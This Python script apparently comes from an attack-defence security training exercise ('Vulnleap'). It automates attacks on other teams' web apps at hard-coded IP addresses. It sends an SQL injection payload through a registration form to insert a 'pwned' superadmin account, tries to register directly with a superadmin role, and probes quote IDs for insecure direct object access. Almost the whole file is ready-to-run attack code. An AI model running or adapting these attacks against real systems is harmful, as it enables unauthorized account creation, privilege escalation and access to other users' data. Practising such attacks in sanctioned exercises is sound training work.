#!/usr/bin/env python3
"""
Attack script for Vulnleap security training
"""
import requests
import sys

def sql_injection_attack(target_url):
    """Perform SQL injection to escalate privileges"""
    print(f"[*] Attacking {target_url}")
    
    # SQL injection payload to create superadmin user
    payload = {
        'username': "hacker'; INSERT INTO users (username, password_hash, user_type) VALUES ('pwned', '$2b$12$dummy_hash', 'superadmin'); --",
        'password': 'password123',
        'confirm_password': 'password123',
        'role': 'normal'
    }
    
    try:
        response = requests.post(f"{target_url}/register", data=payload, timeout=10)
        if response.status_code == 200:
            print(f"[+] SQL injection attempted on {target_url}")
            return True
        else:
            print(f"[-] Failed to attack {target_url}: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error attacking {target_url}: {e}")
        return False

def privilege_escalation_attack(target_url):
    """Try to register as admin directly"""
    print(f"[*] Attempting privilege escalation on {target_url}")
    
    payload = {
        'username': 'evil_admin',
        'password': 'password123',
        'confirm_password': 'password123',
        'role': 'superadmin'  # Try to register directly as superadmin
    }
    
    try:
        response = requests.post(f"{target_url}/register", data=payload, timeout=10)
        if "successfully" in response.text.lower():
            print(f"[+] Privilege escalation successful on {target_url}")
            return True
        else:
            print(f"[-] Privilege escalation failed on {target_url}")
            return False
    except Exception as e:
        print(f"[-] Error in privilege escalation: {e}")
        return False

def idor_attack(target_url):
    """Attempt to access other users' quotes"""
    print(f"[*] Testing IDOR vulnerability on {target_url}")
    
    # Try to access quotes without authentication
    for quote_id in range(1, 10):
        try:
            response = requests.get(f"{target_url}/quote/{quote_id}", timeout=5)
            if response.status_code == 200 and "quote" in response.text.lower():
                print(f"[+] IDOR successful: Accessed quote {quote_id} on {target_url}")
                return True
        except:
            continue
    
    print(f"[-] IDOR attack failed on {target_url}")
    return False

def main():
    # Target other teams
    targets = [
        "http://54.69.37.82:9001",  # Team 1
        "http://54.69.37.82:9003",  # Team 3
        "http://54.69.37.82:9004",  # Team 4
        "http://54.69.37.82:9005",  # Team 5
    ]
    
    print("🚀 Starting attacks on other teams...")
    
    for target in targets:
        print(f"\n{'='*50}")
        print(f"Attacking: {target}")
        print('='*50)
        
        # Try multiple attack vectors
        sql_injection_attack(target)
        privilege_escalation_attack(target)
        idor_attack(target)

if __name__ == "__main__":
    main()
